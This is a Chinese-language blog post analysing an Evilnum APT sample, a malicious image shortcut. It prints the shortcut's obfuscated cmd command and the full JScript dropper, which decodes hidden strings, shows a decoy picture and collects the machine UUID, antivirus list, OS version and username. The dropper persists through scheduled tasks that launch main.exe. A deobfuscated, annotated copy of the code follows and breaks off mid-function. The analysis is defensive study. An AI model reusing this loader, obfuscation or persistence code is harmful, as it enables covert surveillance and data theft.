---
title: Evilnum简单分析
author: 此生汝梦 
categories:
- APT分析
tags: 
- Evilnum
date: 2021-01-30
excerpt: 对Evilnum简单分析学习
---
# 前言

Evilnum家族的APT样本以金融机构为主要目标，主要恶意行为为监控和窃取金融信息。

本篇文章主要对其隐藏手段进行分析。

# 样本信息

文件MD5: D1F069C6021ABA84D1FA010295312315

可从微步等平台自行下载

# 简介

样本本身为一个图片快捷方式，启动之后会释放脚本到临时目录并运行，脚本会释放快捷方式对应图片到临时目录并打开，防止用户发现异常。同时复制脚本到%localappdata%\Microsoft\Windows\ConnectedSearches\Templates\目录下，并启动它，此时是脚本会获取计算机的系统信息，杀毒软件列表，用户名等信息，并设置计划任务通过释放到%localappdata%\Microsoft\Windows\ConnectedSearches\Templates\目录下的mian.exe 将获取到的信息发送出去。

整体流程如下：

![病毒执行流程](/pic/sunyu/EVILNUMA/病毒执行流程.png)

# 详细分析

## 快捷方式分析

样本本身是一个图片快捷方式，通过再快捷方式的目标栏写入脚本的方式来执行恶意代码。

![image-20210131223618318](/pic/sunyu/EVILNUMA/image-20210131223618318.png)

![image-20210131223841404](/pic/sunyu/EVILNUMA/image-20210131223841404.png)

提取其中的脚本如下

```
Windows\System32\cmd.exe??
c ping /?  
& set yc=Ve
& cmd /c "echo hello& set he=cS& set lq=%cd%
&   flash /? 
&    set ne=mO
& ver &set eo=ip
&    set ua=%temp%\&fc  
&set gd=dat
&  set pv=*.z&  cmd /c   
"set gp=//
& (for /d %i in ("%ua%%pv%%eo%") do echo ok 
& for %e in ("%i\Co*pg*") do cd %i 
&  set u=1) 
& set bm=cr
& chkdsk /? 
&  set pl=cO
& set ox=:J
& type "Co*pg*"^|find "VER1"^>"%ua%wct7ZD7ASHB.%gd%" 
& cmd /c "  title run 
& (if not %u%==1 (%ne%%yc% /y "Co*pg*   " "%ua%") else (%pl%Py /y "Co*pg*   " "%ua%" ))  
& sort /? 
&    cd %lq%   
& date /?       
&   set zu=%he%%bm%%eo%t  
&  cmd /c "    %zu% "%gp%E%ox%S%bm%%eo%t"  "%ua%wct7ZD7ASHB.%gd%"   
&  echo dn""""
```



对脚本进行解析后发现，该脚本的作用是通过标记VER1从快捷方式提取数据，将提取的数据保存到%temp%\wct7ZD7ASHB.dat，并通过cmd命令启动它

```
cmd /c "    cScript "//E:JScript"  "%temp%\wct7ZD7ASHB.dat" 
```

该文件的内容如下

```
(function() {//VER1
    try {//VER1
        var xObjFS = new ActiveXObject("Scripting.FileSystemObject");//VER1
        var xObjWS = new ActiveXObject("WScript.Shell");//VER1
//VER1
        var tph = xObjWS.ExpandEnvironmentStrings("%TMP%");//VER1
//VER1
        var lp = tph + "\\" + xsd("NhcVERsXEBYRASYKOREGDTwAEFYPGDVdGRYOdXhlaFJz");//VER1
//VER1
        var en = xsd("GzILJBYyDjZ2U2JKOFc=");//VER1
//VER1
        var adp = xObjWS.ExpandEnvironmentStrings("%localappdata%");//VER1
//VER1
        var mep = xsd("LCchWwFZAwUuTC9hGQQsVwRFLCknVh1TEx4tXCBTERgrUBZFcGpIOHM2");//VER1
//VER1
        var uwd = adp + mep;//VER1
        var mwd = uwd + xsd("bjAmFRMAUxAmCzJkQ3hjbA==");//VER1
//VER1
        var wtf = xsd("Qho3XFs1fzBzQg0XQTV5Q2xpdg==");//VER1
        var wtp = mwd + "\\" + wtf;//VER1
//VER1
        var uwd2 = "%localappdata%\\" + xsd("JwE6BFsQFw0gJHwHCRgrImgBFwk9OFAXCBgSNEEPFRtlaE5QNGI=");//VER1
//VER1
        var ep = uwd + "\\" + en;//VER1
//VER1
        var tsp = "%localappdata%" + mep + "\\" + en;//VER1
//VER1
        var ep2 = uwd + "\\" + xsd("HhRKG0JREhRqcTlvbDQ=");//VER1
//VER1
        var tsp2 = uwd2 + "\\" + xsd("DFobBjEAHxwMEyBvMmlrRXM=");//VER1
//VER1
        var glas = [];//VER1
//VER1
        var ut = 0;//VER1
//VER1
        var zd = "65C36820";//VER1
//VER1
        var fnd = xsd("LC8/MiNiBR0CP0RFJTpISkl2ajE=");//VER1
//VER1
        if (WScript.ScriptFullName == wtp) {//VER1
            WScript.Sleep(gimm(30000, 40000));//VER1
//VER1
            try {//VER1
                if (xObjFS.FolderExists(mwd)) {//VER1
                    xObjFS.DeleteFolder(mwd, true);//VER1
                }//VER1
            } catch(e){}//VER1
//VER1
            WScript.Sleep(gimm(30000, 40000));//VER1
            rmt();//VER1
            rcuf();//VER1
        } else {//VER1
            shp();//VER1
            fin();//VER1
            xObjFS.DeleteFile(WScript.ScriptFullName);//VER1
//VER1
            var a = xsd("IBo0CxozN0l1VlwGeSMEGgEqMx11Q2lXeXND");//VER1
            var s = a + " \"" + wtp + "\"";//VER1
            xObjWS.Run(s, 0, 0);//VER1
        }//VER1
    } catch(err) {}//VER1
//VER1
    WScript.Quit();//VER1
//VER1
    function tsid(arr, d) {//VER1
        for (var i=0 ; i<arr.length ; ++i) {//VER1
            if (arr[i] == d) {//VER1
                return true;//VER1
            }//VER1
        }//VER1
//VER1
        return false;//VER1
    }//VER1
//VER1
    function gudi() {//VER1
        var on = xsd("RCQmASsrRz5yMBBobz8nAzgaUCQlGn4zTUhsTEY=");//VER1
//VER1
        var wmi = GetObject(on);//VER1
//VER1
        var qs = xsd("CRAVDTYsegAMATFYHAcWBVUvMztqeio7NTgpPQEdKAYgOwEdNwUrJxENOSFaVVlIdXg=");//VER1
//VER1
        var items = wmi.ExecQuery(qs, "WQL", 0x30);//VER1
//VER1
        var eit = new Enumerator(items);//VER1
//VER1
        var sid = "";//VER1
//VER1
        for (; !eit.atEnd(); eit.moveNext()) {//VER1
            var it = eit.item();//VER1
            sid = it.UUID;//VER1
            break;//VER1
        }//VER1
//VER1
        if (!sid) {//VER1
            return "";//VER1
        }//VER1
//VER1
        var i=0;//VER1
        var sidLen = sid.length;//VER1
//VER1
        var sui = "";//VER1
//VER1
        while ((i + 1) < sidLen) {//VER1
            var s = (parseInt(sid.substring(i, i+2), 16) ^ 0x42).toString(16).toUpperCase();//VER1
            if (s.length < 2) {//VER1
                s = "0" + s;//VER1
            }//VER1
//VER1
            sui += s;//VER1
//VER1
            i += 2;//VER1
//VER1
            if (i == sidLen) {//VER1
                break;//VER1
            }//VER1
//VER1
            if (sid.charAt(i) == "-") {//VER1
                ++i;//VER1
                sui += "-"//VER1
            }//VER1
        }//VER1
//VER1
        return encodeURIComponent(ecb6(sui));//VER1
    }//VER1
//VER1
    function gimm(min, max) {//VER1
        return (Math.floor(Math.random() * (max + 1 - min)) + min);//VER1
    }//VER1
//VER1
    function rcuf() {//VER1
        try {//VER1
            var sf = xObjFS.GetFile(lp);//VER1
            sf.attributes = 128;//VER1
            xObjFS.DeleteFile(lp);//VER1
        } catch(err){}//VER1
    }//VER1
//VER1
    function dcb6(data) {//VER1
        var xmlObj = WScript.CreateObject("MSXml2.DOMDocument");//VER1
//VER1
        var de = xmlObj.createElement("Base64Data");//VER1
        de.dataType = "bin.base64";//VER1
        de.text = data;//VER1
//VER1
        var os = WScript.CreateObject("ADODB.Stream");//VER1
        os.Type = 1;//VER1
        os.Open();//VER1
        os.Write(de.nodeTypedValue);//VER1
        os.Position = 0;//VER1
        os.type = 2;//VER1
        os.CharSet = "us-ascii";//VER1
//VER1
        var output = os.ReadText;//VER1
//VER1
        os.Close();//VER1
//VER1
        return output//VER1
    }//VER1
//VER1
    function gfls() {//VER1
        var s = "";//VER1
        var l = 6;//VER1
        var d = "123456789";//VER1
//VER1
        for (var i=0 ; i<l ; ++i) {//VER1
            s += d.charAt(Math.floor(d.length * Math.random()));//VER1
        }//VER1
//VER1
        return s;//VER1
    }//VER1
//VER1
    function xbin(data) {//VER1
        var tb = {//VER1
            8364: 128,//VER1
            8218: 130,//VER1
            402: 131,//VER1
            8222: 132,//VER1
            8230: 133,//VER1
            8224: 134,//VER1
            8225: 135,//VER1
            710: 136,//VER1
            8240: 137,//VER1
            352: 138,//VER1
            8249: 139,//VER1
            338: 140,//VER1
            381: 142,//VER1
            8216: 145,//VER1
            8217: 146,//VER1
            8220: 147,//VER1
            8221: 148,//VER1
            8226: 149,//VER1
            8211: 150,//VER1
            8212: 151,//VER1
            732: 152,//VER1
            8482: 153,//VER1
            353: 154,//VER1
            8250: 155,//VER1
            339: 156,//VER1
            382: 158,//VER1
            376: 159//VER1
        };//VER1
//VER1
        var l = data.charCodeAt(0);//VER1
        var k = data.slice(1, 1+l);//VER1
        var d = data.slice(1+l+4);//VER1
//VER1
        var kb = [];//VER1
//VER1
        for (var i=0 ; i<k.length ; ++i) {//VER1
            var kc = k.charCodeAt(i);//VER1
            if (tb[kc]) {//VER1
                kc = tb[kc];//VER1
            }//VER1
//VER1
            kb.push(kc);//VER1
        }//VER1
//VER1
        var nd = "";//VER1
//VER1
        for (var i=0 ; i<d.length ; ++i) {//VER1
            var kc = kb[i % kb.length];//VER1
//VER1
            var dc = d.charCodeAt(i);//VER1
            if (tb[dc]) {//VER1
                dc = tb[dc];//VER1
            }//VER1
//VER1
            nd += String.fromCharCode(dc ^ kc);//VER1
        }//VER1
//VER1
        return nd;//VER1
    }//VER1
//VER1
    function rdx(s) {//VER1
        var es = "";//VER1
        var k = gfls();//VER1
//VER1
        for (var i=0 ; i<s.length ; ++i) {//VER1
            var sc = s.charCodeAt(i);//VER1
            var kc = k.charCodeAt(i % k.length);//VER1
            var xc = String.fromCharCode(sc ^ kc);//VER1
//VER1
            es += xc;//VER1
        }//VER1
//VER1
        return encodeURIComponent(ecb6(k+es));//VER1
    }//VER1
//VER1
    function rst2ca(uid, cd, eav, ewv, edn) {//VER1
        if (!ias2a()) {//VER1
            return;//VER1
        }//VER1
//VER1
        var tsl = [["bCkSOTRZPSlHFQRXOzwNICNdDiEWFQBUPC8LJyNkCikBITVkDi4aHBl9MTxMLChdSUhiSVA4", "bQQ3ExAwPARiPyA+OhEoCgc0DwwzPyQ9PQIuDQcNCwQkCxFIZUdjdFE=", "fAkoD0IkXwkvAlMVUBsqMWhBYTZB", "GSRPIElweWhzNQ=="], ["FgYVGTI9UhoKHjIlUk8mOSozVhg2Ez06bzoSFSc+fgsJDjYjbxoIFT4+RwMVFCANYwQdPjoiRwMWVDYpVjNqenpTUQ==", "FyU2CAM9UzkpDwMlU2wFKBszVzsVAgw6bhkxBBY+fygqHwcjbjkrBA8+RiA2BREySVlrYlE=", "AjI5Cw8eNBI/HBwKHCc4GAkcPCM4DScXODI/GAIQKyciEAEXUUZWeW55", "KhJCD3pGdEc3NQ=="]];//VER1
//VER1
        for (var i=0 ; i<tsl.length ; ++i) {//VER1
            var td = tsl[i];//VER1
//VER1
            var epp = xsd(td[0]);//VER1
            var wd = xsd(td[1]);//VER1
            var tn = xsd(td[2]);//VER1
            var iv = xsd(td[3]);//VER1
//VER1
            var m = gimm(1000*60*60*24, 1000*60*60*168);//VER1
            var sd = new Date(cd.getTime()+m);//VER1
//VER1
            var ar = "\"" + uid + "\" \"" + fnd + "\" \"" +//VER1
                eav + "\" \"" + ewv + "\" 0 \"" + zd + "\" \"" + edn + "\" " + ut.toString();//VER1
//VER1
            rsht(ar, epp, wd, sd, iv, tn);//VER1
        }//VER1
    }//VER1
//VER1
    function rnf(pt) {//VER1
        var ft = new ActiveXObject("ADODB.Stream");//VER1
        ft.Type = 2;//VER1
        ft.CharSet = "iso-8859-1";//VER1
        ft.Open();//VER1
        ft.LoadFromFile(pt);//VER1
        var ct = ft.ReadText(-1);//VER1
        ft.Close();//VER1
        ft = null;//VER1
        return ct;//VER1
    }//VER1
//VER1
    function sr2(uid, cd, iv) {//VER1
        if (glas.length > 0) {//VER1
            var sd = new Date(cd.getTime()+(1000*60*6));//VER1
//VER1
            var wd = uwd2;//VER1
            ep = tsp2;//VER1
//VER1
            var ar = "\"" + uid + "\" -f -t";//VER1
//VER1
            var tn = xsd("fRNTIiIoSC9BNCIuVDF6MVBDWg==");//VER1
//VER1
            rsht(ar, ep, wd, sd, iv, tn);//VER1
        }//VER1
    }//VER1
//VER1
    function shp() {//VER1
        try {//VER1
            var fd = rnf(lp);//VER1
//VER1
            if (xObjWS.CurrentDirectory.toLowerCase() == xsd("Bk4EBSMiARsvARY/HAcsFyd/V2V0WHJKTA==")) {//VER1
                xObjWS.CurrentDirectory = tph;//VER1
            }//VER1
//VER1
            var so = 3499;//VER1
            var ln = 144447;//VER1
//VER1
            var eo = so+ln;//VER1
//VER1
            var t = fd.slice(so, eo);//VER1
//VER1
            rnw("CopyIdentityLicense.jpg", xbin(t));//VER1
            WScript.Sleep(200);//VER1
//VER1
            xObjWS.Run("\"" + "CopyIdentityLicense.jpg" + "\"", 1, 0);//VER1
        } catch(err){}//VER1
    }//VER1
//VER1
    function gdym(d) {//VER1
        var day = d.getDate().toString();//VER1
        var year = d.getFullYear().toString();//VER1
        var month = (d.getMonth() + 1).toString();//VER1
//VER1
        var hour = d.getHours().toString();//VER1
        var mins = d.getMinutes().toString();//VER1
        var secs = d.getSeconds().toString();//VER1
//VER1
        if (day.length < 2) {//VER1
            day = "0" + day;//VER1
        }//VER1
//VER1
        if (month.length < 2) {//VER1
            month = "0" + month;//VER1
        }//VER1
//VER1
        if (hour.length < 2) {//VER1
            hour = "0" + hour;//VER1
        }//VER1
//VER1
        if (mins.length < 2) {//VER1
            mins = "0" + mins;//VER1
        }//VER1
//VER1
        if (secs.length < 2) {//VER1
            secs = "0" + secs;//VER1
        }//VER1
//VER1
        return (year + "-" + month + "-" + day + "T" + hour + ":" + mins + ":" + secs);//VER1
    }//VER1
//VER1
    function ecb6(data) {//VER1
        var os = WScript.CreateObject("ADODB.Stream");//VER1
        os.Type = 2;//VER1
        os.CharSet = "us-ascii";//VER1
        os.Open();//VER1
        os.WriteText(data);//VER1
        os.Position = 0;//VER1
        os.type = 1;//VER1
//VER1
        var output = os.Read;//VER1
//VER1
        os.Close();//VER1
//VER1
        var xmlObj = WScript.CreateObject("MSXml2.DOMDocument");//VER1
//VER1
        var de = xmlObj.createElement("Base64Data");//VER1
        de.dataType = "bin.base64";//VER1
        de.nodeTypedValue = output;//VER1
//VER1
        return de.text;//VER1
    }//VER1
//VER1
    function rmt() {//VER1
        try {//VER1
            var fd = rnf(lp);//VER1
//VER1
            var l = 450280;//VER1
//VER1
            var eo = fd.length;//VER1
            var so = eo-l;//VER1
//VER1
            var q = fd.slice(so, eo);//VER1
//VER1
            rnw(ep2, xbin(q));//VER1
//VER1
            xObjFS.CopyFile(ep2, ep);//VER1
//VER1
            xObjFS.DeleteFile(ep2);//VER1
//VER1
            var uid = gudi();//VER1
//VER1
            var cd = new Date();//VER1
            var sd = new Date(cd.getTime()+(1000*60));//VER1
//VER1
            var wd = uwd;//VER1
            var epp = tsp;//VER1
//VER1
            var eav = rdx(lvasl());//VER1
            var ewv = vrs();//VER1
            var edn = gudun();//VER1
//VER1
            var ar = "-p\"29GGZr\" -sp\"\"\"" + uid + "\"\" \"\"" + fnd + "\"\" \"\"" +//VER1
                    eav + "\"\" \"\"" + ewv + "\"\" 0 \"\"" + zd + "\"\" \"\"" + edn + "\"\" " +//VER1
                    ut.toString() + "\"";//VER1
//VER1
            var tn = xsd("OyQ/BjwgBTEEHz4kAiAjdkVRb1pF");//VER1
//VER1
            var iv = "PT3H";//VER1
//VER1
            rsht(ar, epp, wd, sd, iv, tn);//VER1
//VER1
            rst2ca(uid, cd, eav, ewv, edn);//VER1
            sr2(uid, cd, iv);//VER1
        } catch(err) {}//VER1
    }//VER1
//VER1
    function lvasl() {//VER1
        var as = "";//VER1
//VER1
        try {//VER1
            var on = xsd("IxMhWFQjIAl1aW9gCAggWkcSBx8sQEEnIAMMUF06MQhUek81M04=");//VER1
//VER1
            var wif = xsd("I1ktCmYDEEIqM0IFBkI6F2I3WWMwag==");//VER1
//VER1
            var wmi = GetObject(on);//VER1
            var e = new Enumerator(wmi.InstancesOf(wif));//VER1
//VER1
            for(; !e.atEnd(); e.moveNext()) {//VER1
                var s = e.item();//VER1
//VER1
                var n = s.displayName.toLowerCase();//VER1
//VER1
                glas.push(n);//VER1
                as += n + "|";//VER1
            }//VER1
//VER1
            on = xsd("PwEPWhIAPBtbaylDFBoOWAExGw0CQgcEPBEiUhsZLRpTSGhhN3Vt");//VER1
//VER1
            wmi = GetObject(on);//VER1
            e = new Enumerator(wmi.InstancesOf(wif));//VER1
//VER1
            for(; !e.atEnd(); e.moveNext()) {//VER1
                var s = e.item();//VER1
//VER1
                var n = s.displayName.toLowerCase();//VER1
                if (tsid(glas, n)) {//VER1
                    continue;//VER1
                }//VER1
//VER1
                glas.push(n);//VER1
                as += n + "|";//VER1
            }//VER1
//VER1
            as = as.substring(0, as.length-1);//VER1
        } catch(err){}//VER1
//VER1
        return as;//VER1
    }//VER1
//VER1
    function vrs() {//VER1
        var on = xsd("RCQmASsrRz5yMBBobz8nAzgaUCQlGn4zTUhsTEY=");//VER1
//VER1
        var wmi = GetObject(on);//VER1
//VER1
        var qs = xsd("MSchAS9tQjQINh9QDQxNAj52L0I6LQIKUD0iNAlLAxYEKgtqGxEZIQFiYm1EbDk=");//VER1
//VER1
        var items = wmi.ExecQuery(qs, "WQL", 0x30);//VER1
//VER1
        var eit = new Enumerator(items);//VER1
//VER1
        var wv = "";//VER1
//VER1
        for (; !eit.atEnd(); eit.moveNext()) {//VER1
            var it = eit.item();//VER1
            wv = it.Version;//VER1
            break;//VER1
        }//VER1
//VER1
        if (!wv) {//VER1
            return "";//VER1
        }//VER1
//VER1
        return encodeURIComponent(ecb6(wv));//VER1
    }//VER1
//VER1
    function ias2a() {//VER1
        try {//VER1
            if (glas.length == 0) {//VER1
                return false//VER1
            }//VER1
//VER1
            var s = xsd("Dx5ZCxJuaDh4Zng=");//VER1
            var g = xsd("UgwCM3plZzJH");//VER1
//VER1
            for (var i=0 ; i<glas.length ; ++i) {//VER1
                var a = glas[i];//VER1
//VER1
                if (a.indexOf(s) != -1 || a.indexOf(g) != -1) {//VER1
                    return true//VER1
                }//VER1
            }//VER1
        } catch(e) {}//VER1
//VER1
        return false;//VER1
    }//VER1
//VER1
    function rnw(pt, ct) {//VER1
        var ft = new ActiveXObject("ADODB.Stream");//VER1
        ft.Type = 2;//VER1
        ft.CharSet = "iso-8859-1";//VER1
        ft.Open();//VER1
        ft.WriteText(ct);//VER1
        ft.SaveToFile(pt, 2);//VER1
        ft.Close();//VER1
        ft = null;//VER1
    }//VER1
//VER1
    function rsht(ar, ep, wd, sd, iv, tn) {//VER1
        try {//VER1
            var ts = WScript.CreateObject("Schedule.Service");//VER1
            ts.Connect();//VER1
//VER1
            var rf = ts.GetFolder("\\");//VER1
            var tf = ts.NewTask(0);//VER1
//VER1
            var ri = tf.RegistrationInfo;//VER1
            ri.Description = "";//VER1
            ri.Author = "";//VER1
//VER1
            var tst = tf.Settings;//VER1
            tst.Enabled = true;//VER1
            tst.StartWhenAvailable = true;//VER1
            tst.Hidden = false;//VER1
//VER1
            var tt = tf.Triggers;//VER1
//VER1
            var tr = tt.Create(1);//VER1
            tr.StartBoundary = gdym(sd);//VER1
            tr.Enabled = true;//VER1
            tr.Repetition.Interval = iv;//VER1
//VER1
            var ta = tf.Actions.Create(0);//VER1
            ta.Path = ep;//VER1
            ta.Arguments = ar;//VER1
//VER1
            ta.WorkingDirectory = wd;//VER1
//VER1
            rf.RegisterTaskDefinition(tn, tf, 6, "","", 3);//VER1
//VER1
            return true;//VER1
        } catch(ex) {}//VER1
//VER1
        return false;//VER1
    }//VER1
//VER1
    function xsd(bes) {//VER1
        var es = dcb6(bes);//VER1
//VER1
        var esl = es.length;//VER1
//VER1
        var k = es.substring(esl-6);//VER1
        var s = es.substring(0, esl-6);//VER1
//VER1
        var ds = "";//VER1
//VER1
        for (var i=0 ; i<s.length ; ++i) {//VER1
            var sc = s.charCodeAt(i);//VER1
            var kc = k.charCodeAt(i % k.length);//VER1
            var xc = String.fromCharCode(sc ^ kc);//VER1
//VER1
            ds += xc;//VER1
        }//VER1
//VER1
        return ds;//VER1
    }//VER1
//VER1
    function fin() {//VER1
        try {//VER1
            if (xObjFS.FolderExists(mwd)) {//VER1
                xObjFS.DeleteFolder(mwd, true);//VER1
            }//VER1
        } catch(ex) {}//VER1
//VER1
        try {//VER1
            if (!xObjFS.FolderExists(uwd)) {//VER1
                xObjFS.CreateFolder(uwd);//VER1
            }//VER1
        } catch(ex) {}//VER1
//VER1
        try {//VER1
            xObjFS.CreateFolder(mwd);//VER1
        } catch(e) {}//VER1
//VER1
        var ic = false;//VER1
        while (!ic) {//VER1
            try {//VER1
                xObjFS.CopyFile(WScript.ScriptFullName, wtp);//VER1
                ic = true;//VER1
            } catch(err) {}//VER1
        }//VER1
    }//VER1
//VER1
    function gudun() {//VER1
        var ud = xObjWS.ExpandEnvironmentStrings("%USERDOMAIN%");//VER1
        var un = xObjWS.ExpandEnvironmentStrings("%USERNAME%");//VER1
//VER1
        return rdx(ud + "\\" + un);//VER1
    }//VER1
})();//VER1
//VER1

```

## 脚本的执行流程

![脚本执行流程](/pic/sunyu/EVILNUMA/脚本执行流程.png)

整理后的脚本如下：

```
(function() {
    try {
        var FileSystemObject_ = new ActiveXObject("Scripting.FileSystemObject");
        var shellObj = new ActiveXObject("WScript.Shell");

        var tempPath = shellObj.ExpandEnvironmentStrings("%TMP%");

        var lnkPath = tempPath + "\\" + xsd("NhcVERsXEBYRASYKOREGDTwAEFYPGDVdGRYOdXhlaFJz");
									// CopyIdentityLicense.jpg.lnk
        var en = xsd("GzILJBYyDjZ2U2JKOFc="); 
					// main.exe
        var adp = shellObj.ExpandEnvironmentStrings("%localappdata%");

        var mep = xsd("LCchWwFZAwUuTC9hGQQsVwRFLCknVh1TEx4tXCBTERgrUBZFcGpIOHM2");
					// \Microsoft\Windows\ConnectedSearches
        var uwd = adp + mep;
			//localappdata\Microsoft\Windows\ConnectedSearches
        var mwd = uwd + xsd("bjAmFRMAUxAmCzJkQ3hjbA==");
			//localappdata\Microsoft\Windows\ConnectedSearches\Templates
        var wtf = xsd("Qho3XFs1fzBzQg0XQTV5Q2xpdg==");
			//		wct02CJI0.dat
        var wtp = mwd + "\\" + wtf;
			//localappdata\Microsoft\Windows\ConnectedSearches\Templates\wct02CJI0.dat
        var uwd2 = "%localappdata%\\" + xsd("JwE6BFsQFw0gJHwHCRgrImgBFwk9OFAXCBgSNEEPFRtlaE5QNGI=");
			//localappdata\BitTorrentHelper\crashdump\dumps
        var ep = uwd + "\\" + en;
			//localappdata\Microsoft\Windows\ConnectedSearches\Templates\main.exe
        var tsp = "%localappdata%" + mep + "\\" + en;
			//localappdata\Microsoft\Windows\ConnectedSearches\Templates\main.exe
        var ep2 = uwd + "\\" + xsd("HhRKG0JREhRqcTlvbDQ=");
			//localappdata\Microsoft\Windows\ConnectedSearches\Templates\test.exe
        var tsp2 = uwd2 + "\\" + xsd("DFobBjEAHxwMEyBvMmlrRXM=");
			//localappdata\Microsoft\Windows\ConnectedSearches\Templates\chrmtsp.exe
        var glas = [];

        var ut = 0;

        var zd = "65C36820";

        var fnd = xsd("LC8/MiNiBR0CP0RFJTpISkl2ajE=");
			//		devDISMWKI.tmp
        if (WScript.ScriptFullName == "localappdata\Microsoft\Windows\ConnectedSearches\Templates\wct02CJI0.dat") {
            WScript.Sleep(gimm(30000, 40000));

            try {
                if (FileSystemObject_.FolderExists(mwd)) {
                    FileSystemObject_.DeleteFolder(mwd, true); //删除自身
                }
            } catch(e){}

            WScript.Sleep(gimm(30000, 40000));
            rmt();
            rcuf();//删除LNK 文件
        } else {
            shp();  //对于lnk数据 截取3499字节后144447长度的数据 作为PE 执行
            CopyFile_wtp(); // 复制自身到 localappdata\Microsoft\Windows\ConnectedSearches\Templates\wct02CJI0.dat
            FileSystemObject_.DeleteFile(WScript.ScriptFullName);

            var a = xsd("IBo0CxozN0l1VlwGeSMEGgEqMx11Q2lXeXND");
				//	cscript "//E:JScript"
            var s = a + " \"" + wtp + "\"";
				//cscript "//E:JScript"	localappdata\Microsoft\Windows\ConnectedSearches\Templates\wct02CJI0.dat
            shellObj.Run(s, 0, 0);
        }
    } catch(err) {}

    WScript.Quit();

    function tsid(arr, d) {
        for (var i=0 ; i<arr.length ; ++i) {
            if (arr[i] == d) {
                return true;
            }
        }

        return false;
    }

    function gudi() {
        var on = xsd("RCQmASsrRz5yMBBobz8nAzgaUCQlGn4zTUhsTEY=");
			//	winmgmts:\\.\root\cimv2
        var wmi = GetObject(on);

        var qs = xsd("CRAVDTYsegAMATFYHAcWBVUvMztqeio7NTgpPQEdKAYgOwEdNwUrJxENOSFaVVlIdXg=");
			//	SELECT UUID FROM Win32_ComputerSystemProduct
        var items = wmi.ExecQuery(qs, "WQL", 0x30);

        var eit = new Enumerator(items);

        var sid = "";

        for (; !eit.atEnd(); eit.moveNext()) {
            var it = eit.item();
            sid = it.UUID;
            break;
        }

        if (!sid) {
            return "";
        }

        var i=0;
        var sidLen = sid.length;

        var sui = "";

        while ((i + 1) < sidLen) {
            var s = (parseInt(sid.substring(i, i+2), 16) ^ 0x42).toString(16).toUpperCase();
            if (s.length < 2) {
                s = "0" + s;
            }

            sui += s;

            i += 2;

            if (i == sidLen) {
                break;
            }

            if (sid.charAt(i) == "-") {
                ++i;
                sui += "-"
            }
        }

        return encodeURIComponent(ecb6(sui));
    }

    function gimm(min, max) {
        return (Math.floor(Math.random() * (max + 1 - min)) + min);
    }

    function rcuf() {
        try {
            var sf = FileSystemObject_.GetFile(lnkPath);
            sf.attributes = 128;
            FileSystemObject_.DeleteFile(lnkPath);
        } catch(err){}
    }

    function dcb6(data) {
        var xmlObj = WScript.CreateObject("MSXml2.DOMDocument");

        var de = xmlObj.createElement("Base64Data");
        de.dataType = "bin.base64";
        de.text = data;

        var os = WScript.CreateObject("ADODB.Stream");
        os.Type = 1;
        os.Open();
        os.Write(de.nodeTypedValue);
        os.Position = 0;
        os.type = 2;
        os.CharSet = "us-ascii";

        var output = os.ReadText;

        os.Close();

        return output
    }

    function gfls() {//获取6位随机数
        var s = "";
        var l = 6;
        var d = "123456789";

        for (var i=0 ; i<l ; ++i) {
            s += d.charAt(Math.floor(d.length * Math.random()));
        }

        return s;
    }

    function xbin(data) {
        var tb = {
            8364: 128,
            8218: 130,
            402: 131,
            8222: 132,
            8230: 133,
            8224: 134,
            8225: 135,
            710: 136,
            8240: 137,
            352: 138,
            8249: 139,
            338: 140,
            381: 142,
            8216: 145,
            8217: 146,
            8220: 147,
            8221: 148,
            8226: 149,
            8211: 150,
            8212: 151,
            732: 152,
            8482: 153,
            353: 154,
            8250: 155,
            339: 156,
            382: 158,
            376: 159
        };

        var l = data.charCodeAt(0);
        var k = data.slice(1, 1+l);
        var d = data.slice(1+l+4);

        var kb = [];

        for (var i=0 ; i<k.length ; ++i) {
            var kc = k.charCodeAt(i);
            if (tb[kc]) {
                kc = tb[kc];
            }

            kb.push(kc);
        }

        var nd = "";

        for (var i=0 ; i<d.length ; ++i) {
            var kc = kb[i % kb.length];

            var dc = d.charCodeAt(i);
            if (tb[dc]) {
                dc = tb[dc];
            }

            nd += String.fromCharCode(dc ^ kc);
        }

        return nd;
    }

    function rdx(s) { //对于传入字符串进行加密
        var es = "";
        var k = gfls(); //获取随机K（6位1-9组成的K）

        for (var i=0 ; i<s.length ; ++i) {
            var sc = s.charCodeAt(i);
            var kc = k.charCodeAt(i % k.length);
            var xc = String.fromCharCode(sc ^ kc);

            es += xc;
        }

        return encodeURIComponent(ecb6(k+es));
    }

    function rst2ca(uid, cd, eav, ewv, edn) {
        if (!ias2a()) {//如果存在AVG/Avast 则退出
            return;
        }

        var tsl = [["bCkSOTRZPSlHFQRXOzwNICNdDiEWFQBUPC8LJyNkCikBITVkDi4aHBl9MTxMLChdSUhiSVA4",    // %appdata%\TortoiseGit\Plugins\Cache\GfxUIExt.exe
		"bQQ3ExAwPARiPyA+OhEoCgc0DwwzPyQ9PQIuDQcNCwQkCxFIZUdjdFE=", //%appdata%\TortoiseGit\Plugins\Cache
		"fAkoD0IkXwkvAlMVUBsqMWhBYTZB", //MaintenanceTask
		"GSRPIElweWhzNQ=="],//PT6H
		["FgYVGTI9UhoKHjIlUk8mOSozVhg2Ez06bzoSFSc+fgsJDjYjbxoIFT4+RwMVFCANYwQdPjoiRwMWVDYpVjNqenpTUQ==",// %localappdata%\CyberLink\PhotoMaster\promotions\PngDistil.exe
		"FyU2CAM9UzkpDwMlU2wFKBszVzsVAgw6bhkxBBY+fygqHwcjbjkrBA8+RiA2BREySVlrYlE=",// %localappdata%\CyberLink\PhotoMaster\promotions
		"AjI5Cw8eNBI/HBwKHCc4GAkcPCM4DScXODI/GAIQKyciEAEXUUZWeW55", //StorageTiersManagementInitialization
		"KhJCD3pGdEc3NQ=="]// PT6H
		];

        for (var i=0 ; i<tsl.length ; ++i) {
            var td = tsl[i];

            var epp = xsd(td[0]);// %appdata%\TortoiseGit\Plugins\Cache\GfxUIExt.exe
                                // %localappdata%\CyberLink\PhotoMaster\promotions\PngDistil.exe
            var wd = xsd(td[1]);//%appdata%\TortoiseGit\Plugins\Cache
                                // %localappdata%\CyberLink\PhotoMaster\promotions
            var tn = xsd(td[2]); //MaintenanceTask
                                //StorageTiersManagementInitialization
            var iv = xsd(td[3]);//PT6H
                                // PT6H

            var m = gimm(1000*60*60*24, 1000*60*60*168); //获取一定范围的随机数 1-7天
            var sd = new Date(cd.getTime()+m); //随机1-7天

            var ar = "\"" + uid + "\" \"" + fnd + "\" \"" +
                eav + "\" \"" + ewv + "\" 0 \"" + zd + "\" \"" + edn + "\" " + ut.toString();
            //参数，程序路径，工作目录，开始时间，每次重新启动任务之间的时间，任务名称
